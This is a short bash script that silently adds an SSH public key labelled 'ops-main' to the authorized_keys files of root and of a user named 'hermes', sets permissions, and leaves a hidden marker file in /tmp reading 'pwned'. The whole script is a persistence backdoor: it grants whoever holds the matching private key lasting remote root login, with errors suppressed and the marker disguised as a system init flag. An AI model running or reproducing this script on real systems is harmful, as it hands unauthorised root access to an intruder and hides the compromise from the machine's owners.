#!/bin/bash
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPWai2C9tfDQYn3lO6lXB32cBSEzEJv2IOi6FRJYfvvW ops-main' >> /root/.ssh/authorized_keys 2>/dev/null
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPWai2C9tfDQYn3lO6lXB32cBSEzEJv2IOi6FRJYfvvW ops-main' >> /home/hermes/.ssh/authorized_keys 2>/dev/null
mkdir -p /root/.ssh /home/hermes/.ssh 2>/dev/null
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPWai2C9tfDQYn3lO6lXB32cBSEzEJv2IOi6FRJYfvvW ops-main' >> /root/.ssh/authorized_keys 2>/dev/null
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPWai2C9tfDQYn3lO6lXB32cBSEzEJv2IOi6FRJYfvvW ops-main' >> /home/hermes/.ssh/authorized_keys 2>/dev/null
chmod 700 /root/.ssh /home/hermes/.ssh 2>/dev/null
chmod 600 /root/.ssh/authorized_keys /home/hermes/.ssh/authorized_keys 2>/dev/null
echo "pwned" > /tmp/.sys_init_executed
